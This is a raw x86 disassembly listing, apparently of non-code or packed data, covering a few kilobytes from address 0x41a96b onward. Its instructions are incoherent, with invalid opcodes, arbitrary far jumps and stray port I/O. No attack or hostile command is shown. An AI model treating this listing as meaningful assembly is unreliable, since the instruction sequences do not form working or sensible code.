  41a96b:	mov    dh,0xc4
  41a96d:	mov    eax,DWORD PTR [edi+eax*8-0x3c0ebddd]
  41a974:	dec    edx
  41a975:	xchg   ebx,eax
  41a976:	jge    0x41a95a
  41a978:	retf   0xe284
  41a97b:	jmp    0x41a9f4
  41a97d:	lods   al,BYTE PTR ds:[esi]
  41a97e:	cmc    
  41a97f:	sbb    edx,DWORD PTR [ebx-0x71]
  41a982:	dec    eax
  41a983:	inc    edi
  41a984:	sbb    DWORD PTR [ebx-0x27],ecx
  41a987:	sbb    edi,0x91836c3d
  41a98d:	mov    bh,0x5d
  41a98f:	or     edi,ebx
  41a991:	out    0x5,al
  41a993:	or     ch,BYTE PTR [ebx+0x4689741b]
  41a999:	cs xchg esi,eax
  41a99b:	bndstx [edi-0x5acb3fbf],(bad)
  41a9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9a3:	scas   al,BYTE PTR es:[edi]
  41a9a4:	xor    DWORD PTR [edi+esi*2-0x3464eef0],0x53f3da0c
  41a9af:	cmp    al,0xe7
  41a9b1:	mov    DWORD PTR [ecx-0x55],0x4758a5dc
  41a9b8:	mov    edi,DWORD PTR [ebx]
  41a9ba:	mov    dl,0x42
  41a9bc:	mov    ebx,0x856c3226
  41a9c1:	pop    edi
  41a9c2:	(bad)  
  41a9c3:	cs mov dl,0x12
  41a9c6:	add    DWORD PTR [esi],ecx
  41a9c8:	mov    BYTE PTR [ecx+eax*4+0x1a],bl
  41a9cc:	jmp    0x75fb:0x2f333169
  41a9d3:	rcr    DWORD PTR [edi-0x26],0x6e
  41a9d7:	mov    esi,0x5b6e0b69
  41a9dc:	rol    DWORD PTR [eax+ecx*2+0x4ba80ada],cl
  41a9e3:	shl    DWORD PTR [ecx+0x7eb55569],1
  41a9e9:	call   0x0:0xf578124a
	...
  41a9f8:	add    BYTE PTR [eax],al
  41a9fa:	add    BYTE PTR [edx],bl
  41a9fc:	jbe    0x41a99b
  41a9fe:	outs   dx,DWORD PTR ds:[esi]
  41a9ff:	std    
  41aa00:	out    dx,eax
  41aa01:	cli    
  41aa02:	ja     0x41aa38
  41aa04:	je     0x41aa60
  41aa06:	outs   dx,DWORD PTR ds:[esi]
  41aa07:	fs xchg esi,eax
  41aa09:	pop    edi
  41aa0a:	rcr    eax,0x63
  41aa0d:	add    DWORD PTR [eax],eax
  41aa0f:	sub    eax,DWORD PTR [edx]
  41aa11:	add    BYTE PTR [eax],al
  41aa13:	pop    esi
  41aa14:	in     eax,dx
  41aa15:	push   edx
  41aa16:	pop    edi
  41aa17:	mov    edx,0x418d5102
  41aa1c:	cli    
  41aa1d:	sub    ch,BYTE PTR [ecx+0x31]
  41aa20:	(bad)  
  41aa21:	mov    cl,0x14
  41aa23:	mov    al,ds:0x8de73e77
  41aa28:	cmc    
  41aa29:	rcr    ebx,0xb3
  41aa2c:	cmp    DWORD PTR [ecx],0x874dbfb2
  41aa32:	dec    ebp
  41aa33:	cdq    
  41aa34:	pop    esp
  41aa35:	mov    ch,0xa
  41aa37:	pop    es
  41aa38:	fistp  QWORD PTR [edx-0x55305aea]
  41aa3e:	sbb    cl,BYTE PTR [eax]
  41aa40:	ror    DWORD PTR [edi+eiz*8+0x24],cl
  41aa44:	add    ebp,edi
  41aa46:	out    dx,al
  41aa47:	push   edi
  41aa48:	int3   
  41aa49:	push   eax
  41aa4a:	int3   
  41aa4b:	fldenv [edi]
  41aa4d:	bound  ebp,QWORD PTR [edx+0x6e3d1020]
  41aa53:	popa   
  41aa54:	adc    ebp,ebx
  41aa56:	lahf   
  41aa57:	sub    BYTE PTR [eax-0x7b],0x88
  41aa5b:	push   edx
  41aa5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa5d:	push   ebp
  41aa5e:	adc    BYTE PTR [edi],0xa1
  41aa61:	sub    al,dh
  41aa63:	jmp    0x41aadb
  41aa65:	cmp    al,0x6d
  41aa67:	outs   dx,BYTE PTR ds:[esi]
  41aa68:	cmp    DWORD PTR [esi-0x19],eax
  41aa6b:	sub    al,0xf1
  41aa6d:	cwde   
  41aa6e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa70:	rcr    BYTE PTR [ebp+0x26015388],cl
  41aa76:	lods   eax,DWORD PTR ds:[esi]
  41aa77:	push   ecx
  41aa78:	inc    edi
  41aa79:	dec    ecx
  41aa7a:	pop    ebx
  41aa7b:	cmp    eax,0x2204cc8a
  41aa80:	daa    
  41aa81:	sub    DWORD PTR [ebx+0x3b88f85c],edx
  41aa87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa88:	stos   DWORD PTR es:[edi],eax
  41aa89:	ins    BYTE PTR es:[edi],dx
  41aa8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa8b:	cmp    ebp,edx
  41aa8d:	lahf   
  41aa8e:	jg     0x41aa8d
  41aa90:	and    eax,0xc0f3f540
  41aa95:	pop    esp
  41aa96:	lock pop esi
  41aa98:	loopne 0x41aa8e
  41aa9a:	pop    ebx
  41aa9b:	jge    0x41aa60
  41aa9d:	aas    
  41aa9e:	mov    ecx,esi
  41aaa0:	pop    ss
  41aaa1:	mov    ebp,0x189753fb
  41aaa6:	idiv   BYTE PTR [esi+ebp*4+0x59eec84f]
  41aaad:	int3   
  41aaae:	and    DWORD PTR [edx-0x57],esi
  41aab1:	add    DWORD PTR [edx+ebp*8],ebx
  41aab4:	not    bl
  41aab6:	ja     0x41aa49
  41aab8:	in     al,dx
  41aab9:	sub    DWORD PTR [ecx-0x4a],ecx
  41aabc:	ja     0x41aad1
  41aabe:	ret    0x28fb
  41aac1:	shl    DWORD PTR [ebx],cl
  41aac3:	mov    ebp,0x3c71eb01
  41aac8:	xor    ebp,ebx
  41aaca:	push   ebx
  41aacb:	cdq    
  41aacc:	cs xchg edx,eax
  41aace:	pusha  
  41aacf:	mov    eax,0xdf657cd
  41aad4:	mov    esp,0x127d01e1
  41aad9:	jnp    0x41aa6a
  41aadb:	test   ecx,ebp
  41aadd:	jle    0x41aacb
  41aadf:	xlat   BYTE PTR ds:[ebx]
  41aae0:	(bad)  [ecx]
  41aae2:	fdiv   st,st(1)
  41aae4:	cmp    DWORD PTR [esp+eax*1-0x37756e52],ebp
  41aaeb:	shl    ah,0x47
  41aaee:	add    DWORD PTR [eax-0x77df2dc8],0x7d
  41aaf5:	xchg   ebp,eax
  41aaf6:	jecxz  0x41ab35
  41aaf8:	inc    esi
  41aaf9:	adc    edi,edx
  41aafb:	cld    
  41aafc:	outs   dx,DWORD PTR ds:[esi]
  41aafd:	pop    ds
  41aafe:	out    dx,eax
  41aaff:	das    
  41ab00:	xchg   ecx,eax
  41ab02:	pop    ds
  41ab03:	test   eax,0xac74fe0d
  41ab08:	pop    DWORD PTR [edi+ebp*1+0x16]
  41ab0c:	cdq    
  41ab0d:	scas   eax,DWORD PTR es:[edi]
  41ab0e:	loop   0x41aaf9
  41ab10:	push   cs
  41ab11:	(bad)  
  41ab12:	stc    
  41ab13:	sbb    esi,0xf978c281
  41ab19:	pop    ecx
  41ab1a:	cmp    DWORD PTR [edx-0x1d],esp
  41ab1d:	int3   
  41ab1e:	shl    BYTE PTR cs:[esi-0x34],1
  41ab22:	imul   edx,DWORD PTR [ecx+eax*8],0xf11f9d10
  41ab29:	inc    ebp
  41ab2a:	aas    
  41ab2b:	rcl    ch,cl
  41ab2d:	lea    ebp,[edx+0x5c8f526a]
  41ab33:	pop    ss
  41ab34:	push   ds
  41ab35:	inc    edx
  41ab36:	ins    DWORD PTR es:[edi],dx
  41ab37:	popa   
  41ab38:	out    0xbb,eax
  41ab3a:	push   edx
  41ab3b:	cs or  cl,cl
  41ab3e:	aaa    
  41ab3f:	je     0x41aadd
  41ab41:	mov    al,ds:0xd24d1540
  41ab46:	xchg   esp,eax
  41ab47:	addr16 dec ebp
  41ab49:	icebp  
  41ab4a:	sub    BYTE PTR [edx],0x8e
  41ab4d:	jns    0x41ab39
  41ab4f:	inc    ebx
  41ab50:	cmp    dl,BYTE PTR [ecx-0x7edbab0b]
  41ab56:	adc    esp,DWORD PTR [edi-0x11e9ded9]
  41ab5c:	sbb    DWORD PTR [esi+edx*4],esi
  41ab5f:	dec    eax
  41ab60:	aaa    
  41ab61:	xchg   edi,eax
  41ab62:	aam    0x5e
  41ab64:	push   0x78
  41ab66:	es aad 0x6e
  41ab69:	mov    ecx,0x86e04c54
  41ab6e:	sahf   
  41ab6f:	fldenv [eax]
  41ab71:	cmp    al,0x4b
  41ab73:	push   0x439578f9
  41ab78:	xchg   edi,eax
  41ab79:	pushf  
  41ab7a:	jmp    0x89c6:0xf5471d5e
  41ab81:	dec    ebx
  41ab82:	mov    ebp,DWORD PTR [edi]
  41ab84:	dec    ebp
  41ab85:	loopne 0x41ab4b
  41ab87:	dec    esp
  41ab88:	(bad)  
  41ab89:	push   esp
  41ab8a:	popa   
  41ab8b:	push   0xf11ec9bb
  41ab90:	adc    al,0x7b
  41ab92:	dec    edi
  41ab93:	add    BYTE PTR ds:0x7540b002,dl
  41ab99:	mov    esi,0x39d534c5
  41ab9e:	xlat   BYTE PTR ds:[ebx]
  41ab9f:	xchg   ebx,eax
  41aba0:	xor    edi,eax
  41aba2:	repz xchg edi,eax
  41aba4:	lock ja 0x41ab42
  41aba7:	dec    edx
  41aba8:	(bad)  
  41aba9:	stos   DWORD PTR es:[edi],eax
  41abaa:	fcomp  QWORD PTR [ecx]
  41abac:	fs hlt 
  41abae:	out    dx,al
  41abaf:	mov    edx,0xca7c1ed4
  41abb4:	aad    0x66
  41abb6:	repnz neg DWORD PTR [edx-0x77]
  41abba:	pop    ds
  41abbb:	mov    edi,0x4c49ffbc
  41abc0:	ret    0x68de
  41abc3:	dec    esp
  41abc4:	xchg   edx,eax
  41abc5:	jb     0x41abf0
  41abc7:	xchg   esi,eax
  41abc8:	push   ds
  41abc9:	adc    ecx,DWORD PTR ds:0x86ddc16d
  41abcf:	inc    BYTE PTR [ebx+ebx*8+0x6ba69beb]
  41abd6:	ret    
  41abd7:	ror    DWORD PTR [edx],0x1b
  41abda:	jno    0x41ab84
  41abdc:	cmp    edi,eax
  41abde:	inc    ebx
  41abdf:	dec    edx
  41abe0:	test   DWORD PTR [esi+0x2ee94bb3],edi
  41abe6:	loop   0x41ac02
  41abe8:	cli    
  41abe9:	inc    ecx
  41abea:	pop    eax
  41abeb:	xlat   BYTE PTR ds:[ebx]
  41abec:	into   
  41abed:	pop    edx
  41abee:	push   esi
  41abef:	aam    0xa
  41abf1:	jmp    0xbe61:0x5ca7d8b4
  41abf8:	jb     0x41abf6
  41abfa:	jle    0x41abb5
  41abfc:	loopne 0x41ac6a
  41abfe:	lds    esp,FWORD PTR [esi-0x75]
  41ac01:	repnz mov esp,0x81be5bbe
  41ac07:	mov    eax,0x3aa986eb
  41ac0c:	adc    eax,0x6fa46226
  41ac11:	mov    DWORD PTR ds:0x1d8a9dff,0xe40c974b
  41ac1b:	popf   
  41ac1c:	fbstp  TBYTE PTR [ebx]
  41ac1e:	dec    eax
  41ac1f:	pusha  
  41ac20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac21:	or     al,0x8c
  41ac23:	dec    ebx
  41ac24:	add    ch,BYTE PTR [esi-0x3f351d21]
  41ac2a:	jno    0x41ac2f
  41ac2c:	js     0x41ac65
  41ac2e:	adc    BYTE PTR gs:[edi-0x24],0xa3
  41ac33:	not    BYTE PTR [ebx]
  41ac35:	add    cl,bh
  41ac37:	mov    ecx,0x49dd5571
  41ac3c:	pop    esi
  41ac3d:	test   al,0x0
	...
  41ac4b:	push   ecx
  41ac4c:	xchg   dl,dl
  41ac4e:	retf   
  41ac4f:	xlat   BYTE PTR ds:[ebx]
  41ac50:	fistp  WORD PTR [ecx-0x62]
  41ac53:	sbb    ecx,edx
  41ac55:	mov    dh,bl
  41ac57:	mov    ds:0x3942475,eax
  41ac5c:	add    WORD PTR [eax],ax
  41ac5f:	sub    eax,DWORD PTR [edx]
  41ac61:	add    BYTE PTR [eax],al
  41ac63:	(bad)  
  41ac64:	rol    BYTE PTR [esp+ecx*8],1
  41ac67:	dec    ebp
  41ac68:	or     BYTE PTR [edi+0x78],bl
  41ac6b:	mov    esp,DWORD PTR [ebx*1-0x4c8eb472]
  41ac72:	jmp    0xa559:0x83ead063
  41ac79:	mov    edi,0xfebc584c
  41ac7e:	in     eax,0x11
  41ac80:	retf   0x7da3
  41ac83:	fist   WORD PTR [edx]
  41ac85:	mov    ds:0x157e74c5,eax
  41ac8a:	outs   dx,BYTE PTR ds:[esi]
  41ac8b:	outs   dx,BYTE PTR ds:[esi]
  41ac8c:	jbe    0x41ac1d
  41ac8e:	repnz dec ebx
  41ac90:	fwait
  41ac91:	jmp    0xab02:0xeaad2aac
  41ac98:	xlat   BYTE PTR ds:[ebx]
  41ac99:	sbb    eax,0x92be0d1c
  41ac9e:	fcom   QWORD PTR [ebx+0x32]
  41aca1:	adc    BYTE PTR [ebx],cl
  41aca3:	fist   WORD PTR [edi+0x4477a1ad]
  41aca9:	aaa    
  41acaa:	jmp    0x117:0xde563db1
  41acb1:	iret   
  41acb2:	mov    ds:0xb2019aad,eax
  41acb7:	and    BYTE PTR [edi],bl
  41acb9:	aam    0x69
  41acbb:	call   0x5fd204b
  41acc0:	lea    esi,[edi+ebx*1]
  41acc3:	inc    edx
  41acc4:	mov    ebp,0x1b62ca6e
  41acc9:	xor    ebx,DWORD PTR [ebx-0x70]
  41accc:	pop    ecx
  41accd:	inc    ebx
  41acce:	push   edx
  41accf:	pusha  
  41acd0:	pop    ecx
  41acd1:	cdq    
  41acd2:	inc    ecx
  41acd3:	popa   
  41acd4:	dec    esi
  41acd5:	mov    ebx,0x4a469e26
  41acda:	int3   
  41acdb:	push   edi
  41acdc:	cs push 0x98a3a4da
  41ace2:	int3   
  41ace3:	push   edx
  41ace4:	mov    edx,0xbc807160
  41ace9:	push   ds
  41acea:	stos   DWORD PTR es:[edi],eax
  41aceb:	mov    ecx,esi
  41aced:	jp     0x41acc0
  41acef:	ja     0x41ad09
  41acf1:	es inc bl
  41acf4:	sub    ebx,DWORD PTR [esi+eiz*4-0x3d]
  41acf8:	mov    cl,0x99
  41acfa:	pop    ebp
  41acfb:	lds    eax,FWORD PTR [ebx+0x52]
  41acfe:	cdq    
  41acff:	(bad)  
  41ad00:	das    
  41ad01:	mov    es,WORD PTR [eax]
  41ad03:	push   edi
  41ad04:	in     al,0x94
  41ad06:	pop    ebp
  41ad07:	mov    dl,0x1a
  41ad09:	frstor [eax]
  41ad0b:	loopne 0x41ad3a
  41ad0d:	push   ecx
  41ad0e:	jecxz  0x41ad6c
  41ad10:	stos   DWORD PTR es:[edi],eax
  41ad11:	rol    bl,cl
  41ad13:	jmp    0x41ad03
  41ad15:	(bad)  
  41ad16:	xlat   BYTE PTR ds:[ebx]
  41ad17:	icebp  
  41ad18:	mov    BYTE PTR [edi-0x64c33e32],al
  41ad1e:	cvtdq2ps xmm2,XMMWORD PTR cs:[ebx]
  41ad22:	mov    eax,ds:0x8f2b7aa7
  41ad27:	shufps xmm5,XMMWORD PTR [edi-0x2584a90d],0x3a
  41ad2f:	mov    ds:0x15391923,al
  41ad34:	test   edi,0xdac5b151
  41ad3a:	sub    eax,eax
  41ad3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad3d:	jnp    0x41adb8
  41ad3f:	xchg   DWORD PTR [ebx],ebx
  41ad41:	mov    eax,ds:0x69578f7c
  41ad46:	pop    ebx
  41ad47:	mov    ah,0xa3
  41ad49:	setp   BYTE PTR [esi]
  41ad4c:	inc    esi
  41ad4d:	cdq    
  41ad4e:	cld    
  41ad4f:	aam    0x2f
  41ad51:	cmp    eax,0xe4c0ed14
  41ad56:	adc    DWORD PTR [edi],esi
  41ad58:	retf   
  41ad59:	mov    cl,0x1c
  41ad5b:	add    DWORD PTR ds:0xe7222c74,ecx
  41ad61:	inc    ecx
  41ad62:	repz and al,ch
  41ad65:	loop   0x41adc6
  41ad67:	or     DWORD PTR ds:0x992159a1,edi
  41ad6d:	sbb    esi,ecx
  41ad6f:	and    eax,0x15b5e819
  41ad74:	inc    edi
  41ad75:	dec    esi
  41ad76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad77:	je     0x41ad90
  41ad79:	mov    ecx,0xb20bc80a
  41ad7e:	xor    DWORD PTR [ebx],esi
  41ad80:	pop    ebp
  41ad81:	or     edx,DWORD PTR [edi]
  41ad83:	pop    edx
  41ad84:	nop
  41ad85:	and    DWORD PTR [ecx+0x7b],0xffffff8d
  41ad89:	xor    BYTE PTR [eax],0xc6
  41ad8c:	loop   0x41ad86
  41ad8e:	outs   dx,BYTE PTR ds:[esi]
  41ad8f:	jo     0x41ad51
  41ad91:	ins    BYTE PTR es:[edi],dx
  41ad92:	inc    ebx
  41ad93:	lods   eax,DWORD PTR ds:[esi]
  41ad94:	ins    BYTE PTR es:[edi],dx
  41ad95:	mov    ah,0xaa
  41ad97:	xor    al,0xaa
  41ad99:	test   BYTE PTR [eax-0x7a967a37],0xc1
  41ada0:	ffreep st(2)
  41ada2:	leave  
  41ada3:	mov    eax,0x1360424b
  41ada8:	(bad)  
  41adaa:	xor    eax,0x4701e320
  41adaf:	lock outs dx,DWORD PTR ds:[esi]
  41adb1:	add    DWORD PTR [esi-0x2d],ebp
  41adb4:	cmp    al,0x59
  41adb6:	push   ebx
  41adb7:	jp     0x41ad95
  41adb9:	pop    ecx
  41adba:	pop    edx
  41adbb:	into   
  41adbc:	add    DWORD PTR [ecx+0x13],edi
  41adbf:	es push es
  41adc1:	jmp    0x41ad45
  41adc3:	bound  eax,QWORD PTR [ecx+0x7eddc57d]
  41adc9:	popa   
  41adca:	fnstenv [ebx-0x7d]
  41adcd:	nop
  41adce:	test   eax,0xd484162a
  41add3:	sbb    esi,ebx
  41add5:	mov    al,0xae
  41add7:	sbb    BYTE PTR [eax],dl
  41add9:	mov    esp,0x48f88d45
  41adde:	jmp    0xf808:0x8741af03
  41ade5:	cmp    ecx,DWORD PTR [esi-0x2b]
  41ade8:	pusha  
  41ade9:	push   es
  41adea:	or     ecx,DWORD PTR [edx+0x4cb023e9]
  41adf0:	xchg   DWORD PTR [eax+0x5b],ebp
  41adf3:	call   0x650656fa
  41adf8:	aas    
  41adf9:	cld    
  41adfa:	adc    bl,BYTE PTR [edi-0x71]
  41adfd:	or     al,0x75
  41adff:	mov    edx,0xedb38fd1
  41ae04:	jne    0x41ae83
  41ae06:	out    0xf1,eax
  41ae08:	xor    DWORD PTR [ebp-0x4a4615bf],ecx
  41ae0e:	mov    cl,0x20
  41ae10:	rol    BYTE PTR [edi+0x2f4e89a],0x64
  41ae17:	pop    ebp
  41ae18:	or     eax,0x7991b428
  41ae1d:	idiv   bh
  41ae1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae20:	stos   DWORD PTR es:[edi],eax
  41ae21:	fidivr WORD PTR [eax+eax*2-0x4e208aa6]
  41ae28:	adc    DWORD PTR [esi+0x54],ebp
  41ae2b:	lahf   
  41ae2c:	xchg   DWORD PTR [edi],edx
  41ae2e:	bnd jae 0x41aeac
  41ae31:	cmp    edi,DWORD PTR [edi]
  41ae33:	mov    eax,0x656616f
  41ae38:	cwde   
  41ae39:	and    al,BYTE PTR [edi-0x484b40a3]
  41ae3f:	leave  
  41ae40:	pop    ebp
  41ae41:	sub    eax,0x385bd663
  41ae46:	xlat   BYTE PTR ds:[ebx]
  41ae47:	push   0x55
  41ae49:	cdq    
  41ae4a:	mov    edi,0x309fc040
  41ae4f:	and    BYTE PTR [edi-0x67],ah
  41ae52:	in     al,0x43
  41ae54:	inc    edi
  41ae55:	pusha  
  41ae56:	ja     0x41aecd
  41ae58:	retf   
  41ae59:	popa   
  41ae5a:	xlat   BYTE PTR ds:[ebx]
  41ae5b:	mov    DWORD PTR [ecx],0x518394d7
  41ae61:	addr16 jne 0x41ae88
  41ae64:	mov    ebp,0xc520c47e
  41ae69:	push   0x119060f1
  41ae6e:	mov    eax,ds:0x2d336eb6
  41ae73:	fldenv [eax+0x6557ad67]
  41ae79:	jno    0x41ae09
  41ae7b:	inc    edx
  41ae7c:	cmp    al,0xc5
  41ae7e:	cli    
  41ae7f:	add    bl,dl
  41ae81:	arpl   WORD PTR [edx-0x24],bp
  41ae84:	jle    0x41ae46
  41ae86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae87:	push   es
  41ae88:	stos   DWORD PTR es:[edi],eax
  41ae89:	je     0x41ae75
  41ae8b:	sub    dl,BYTE PTR [ecx]
  41ae8d:	outs   dx,BYTE PTR ds:[esi]
	...
  41ae9a:	add    BYTE PTR [edx],cl
  41ae9c:	xor    eax,DWORD PTR cs:[ebx-0x504560c9]
  41aea3:	jne    0x41af08
  41aea5:	scas   al,BYTE PTR es:[edi]
  41aea6:	jmp    0x682e:0x3600546
  41aead:	add    DWORD PTR [eax],eax
  41aeaf:	sub    eax,DWORD PTR [edx]
  41aeb1:	add    BYTE PTR [eax],al
  41aeb3:	xor    eax,0xa9dc4793
  41aeb8:	popa   
  41aeb9:	jge    0x41aeb3
  41aebb:	or     bl,dl
  41aebd:	push   0x81c79865
  41aec2:	xor    DWORD PTR [edi+0x1f984fe3],edx
  41aec8:	mov    al,ds:0x5b21ba7a
  41aecd:	mov    dl,0xea
  41aecf:	xchg   esp,eax
  41aed0:	aaa    
  41aed1:	inc    eax
  41aed2:	dec    edx
  41aed3:	cmp    ch,BYTE PTR [eax+0x5f]
  41aed6:	jb     0x41ae67
  41aed8:	jmp    0x90423b9e
  41aedd:	fcomp  st(1)
  41aedf:	call   0x3c0fe57d
  41aee4:	add    al,0x1e
  41aee6:	lods   al,BYTE PTR ds:[esi]
  41aee7:	sub    bh,al
  41aee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeea:	inc    ebx
  41aeeb:	mov    eax,0x8bd9029a
  41aef0:	fimul  DWORD PTR [ebx]
  41aef2:	aas    
  41aef3:	sbb    BYTE PTR [edi],al
  41aef5:	mov    ebx,0x9b73ebf2
  41aefa:	jne    0x41af32
  41aefc:	add    ch,dh
  41aefe:	push   eax
  41aeff:	xchg   edi,eax
  41af00:	out    0xc9,al
  41af02:	mov    BYTE PTR [ebx],cl
  41af04:	js     0x41ae8a
  41af06:	(bad)  
  41af07:	pop    ds
  41af08:	jne    0x41af15
  41af0a:	mov    ebp,0x8edd8c8c
  41af0f:	sbb    ecx,ebx
  41af11:	jns    0x41af0b
  41af13:	arpl   WORD PTR [esi-0x30],si
  41af16:	mov    ds:0x6a371cfa,eax
  41af1b:	cmp    eax,0x28fa8385
  41af20:	sbb    BYTE PTR [esi+0x65],al
  41af23:	inc    edi
  41af24:	mov    dh,0x5d
  41af26:	jnp    0x41af63
  41af28:	pop    edi
  41af29:	(bad)  
  41af2a:	and    dl,BYTE PTR [ebp+edi*1+0x5f]
  41af2e:	mov    edi,0x52c67baf
  41af33:	xchg   edx,eax
  41af34:	mov    bh,0xb1
  41af36:	mov    esi,0x526d6781
  41af3b:	cdq    
  41af3c:	or     ch,al
  41af3e:	ins    DWORD PTR es:[edi],dx
  41af3f:	push   ds
  41af40:	xchg   esp,eax
  41af41:	push   esi
  41af42:	add    esp,DWORD PTR [eax+0x563bc867]
  41af48:	jecxz  0x41af40
  41af4a:	xlat   BYTE PTR ds:[ebx]
  41af4b:	int3   
  41af4c:	scas   al,BYTE PTR es:[edi]
  41af4d:	xlat   BYTE PTR ds:[ebx]
  41af4e:	(bad)  
  41af4f:	out    dx,al
  41af50:	out    dx,eax
  41af51:	clc    
  41af52:	pusha  
  41af53:	jbe    0x41af16
  41af55:	dec    eax
  41af56:	cdq    
  41af57:	push   ebx
  41af58:	push   0xa70a7a69
  41af5d:	fmul   QWORD PTR [ebx+0x43926329]
  41af63:	pop    ecx
  41af64:	jne    0x41af1e
  41af66:	push   ds
  41af67:	in     eax,dx
  41af68:	bnd jnp 0x41af7f
  41af6b:	repnz pop esi
  41af6d:	neg    DWORD PTR [eax]
  41af6f:	inc    ebp
  41af70:	(bad)  
  41af71:	int3   
  41af72:	and    DWORD PTR [edi+0xc],edx
  41af75:	mov    esi,0xec94ff0c
  41af7a:	cmp    al,0xea
  41af7c:	js     0x41afd6
  41af7e:	mov    edx,0x7a2b4023
  41af83:	(bad)  
  41af84:	daa    
  41af85:	dec    ebp
  41af86:	cli    
  41af87:	ficomp DWORD PTR [ecx*2+0x6e5aaada]
  41af8e:	adc    ebp,DWORD PTR [ebx]
  41af90:	mov    ds:0x27703bb4,al
  41af95:	int3   
  41af96:	push   edi
  41af97:	outs   dx,DWORD PTR ds:[esi]
  41af98:	(bad)  
  41af99:	arpl   WORD PTR [ebp+0x5471b25b],di
  41af9f:	or     al,0xec
  41afa1:	lods   eax,DWORD PTR ds:[esi]
  41afa2:	imul   edx,DWORD PTR [ebp+0x1d],0x3e7b278
  41afa9:	fld    QWORD PTR [ebx-0x4ae6aff7]
  41afaf:	outs   dx,BYTE PTR ds:[esi]
  41afb0:	or     DWORD PTR [eax+esi*2-0x71],esi
  41afb4:	stc    
  41afb5:	pop    ecx
  41afb6:	jp     0x41af63
  41afb8:	adc    ebp,ebx
  41afba:	and    dh,ch
  41afbc:	jo     0x41b031
  41afbe:	pop    ecx
  41afbf:	xchg   BYTE PTR [esi],ah
  41afc1:	adc    bh,BYTE PTR [ebx]
  41afc3:	inc    ebx
  41afc4:	mov    bh,0x7a
  41afc6:	sbb    al,0xd3
  41afc8:	cwde   
  41afc9:	test   BYTE PTR ds:0x265837b,bh
  41afcf:	mov    cl,0xc0
  41afd1:	std    
  41afd2:	mov    ah,0x24
  41afd4:	adc    DWORD PTR [edi],ecx
  41afd6:	or     DWORD PTR [ecx-0x18],edx
  41afd9:	jg     0x41afc5
  41afdb:	clc    
  41afdc:	fs int3 
  41afde:	xor    DWORD PTR [edi+0x64],esp
  41afe1:	jmp    0x21e8d9cf
  41afe6:	outs   dx,BYTE PTR ds:[esi]
  41afe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afe8:	jns    0x41afd9
  41afea:	scas   eax,DWORD PTR es:[edi]
  41afeb:	pop    ebp
  41afec:	pop    ds
  41afed:	es adc cl,dh
  41aff0:	xor    al,0x69
  41aff2:	or     bl,cl
  41aff4:	out    dx,eax
  41aff5:	test   eax,0xafe733e2
  41affa:	into   
  41affb:	dec    edx
  41affc:	push   0xb0d5becd
  41b001:	mov    esp,0xf0f63ac5
  41b006:	xchg   BYTE PTR [ebx-0x508168dd],dl
  41b00c:	test   BYTE PTR [eax+0x1b61fd81],cl
  41b012:	add    edx,edx
  41b014:	aas    
  41b015:	adc    eax,0x3eea4956
  41b01a:	mov    esi,0xf02f1f59
  41b01f:	sub    al,0xb9
  41b021:	ror    BYTE PTR [edx+0x4685ef48],cl
  41b027:	push   esp
  41b028:	lods   al,BYTE PTR ds:[esi]
  41b029:	pop    ebp
  41b02a:	xor    esp,DWORD PTR [esi+0x3a0e7be]
  41b030:	pop    ss
  41b031:	xchg   ebx,eax
  41b032:	and    edi,DWORD PTR [eax]
  41b034:	pop    es
  41b035:	leave  
  41b036:	cmp    ebx,DWORD PTR [edx+0x46df6e8b]
  41b03c:	fsincos 
  41b03e:	push   ecx
  41b03f:	jl     0x41b035
  41b041:	xchg   esp,eax
  41b042:	test   dh,0xcc
  41b045:	inc    ebx
  41b046:	push   esi
  41b047:	cwde   
  41b048:	cmp    eax,0xa560049e
  41b04d:	ret    
  41b04e:	xchg   edx,eax
  41b04f:	leave  
  41b050:	out    dx,eax
  41b051:	or     cl,0xf7
  41b054:	adc    eax,0x4bbc3783
  41b059:	pop    esp
  41b05a:	jae    0x41b04a
  41b05c:	xlat   BYTE PTR ds:[ebx]
  41b05d:	adc    ch,ch
  41b05f:	cmp    edx,DWORD PTR [edx]
  41b061:	retf   0xf359
  41b064:	cmc    
  41b065:	fistp  DWORD PTR [edx]
  41b067:	xor    BYTE PTR [ecx],bh
  41b069:	jmp    0x41b05f
  41b06b:	mov    ah,0xd6
  41b06d:	clc    
  41b06e:	cmp    esi,ecx
  41b070:	stos   BYTE PTR es:[edi],al
  41b071:	sub    DWORD PTR [ecx+0x2e],0xffffff9a
  41b075:	inc    esp
  41b076:	and    eax,0x1377aa0c
  41b07b:	into   
  41b07c:	gs push ds
  41b07e:	push   ebx
  41b07f:	xchg   edx,eax
  41b080:	mov    WORD PTR [esi-0x5f91e497],cs
  41b086:	adc    bl,al
  41b088:	arpl   WORD PTR [eax],bp
  41b08a:	mov    BYTE PTR [ebx+0x70],al
  41b08d:	in     eax,dx
  41b08e:	pusha  
  41b08f:	cmp    ecx,DWORD PTR [ecx+eiz*4-0x456adff8]
  41b096:	xchg   BYTE PTR [esp+esi*1],dl
  41b099:	loope  0x41b02f
  41b09b:	in     al,dx
  41b09c:	inc    ecx
  41b09d:	cli    
  41b09e:	mov    ebp,0xcf00eb77
  41b0a3:	jle    0x41b078
  41b0a5:	cwde   
  41b0a6:	cs (bad) 
  41b0a9:	sub    al,BYTE PTR [edi]
  41b0ab:	(bad)  [ebx-0x43bed0b9]
  41b0b1:	outs   dx,BYTE PTR ds:[esi]
  41b0b2:	sub    esi,DWORD PTR [edi]
  41b0b4:	(bad)  
  41b0b5:	(bad)  
  41b0b6:	jg     0x41b0c3
  41b0b8:	lock mov ecx,0x691b819a
  41b0be:	pop    ebx
  41b0c0:	push   eax
  41b0c1:	push   edi
  41b0c2:	arpl   dx,di
  41b0c4:	bound  esi,QWORD PTR [ebx-0x19e22363]
  41b0ca:	cs and al,0x50
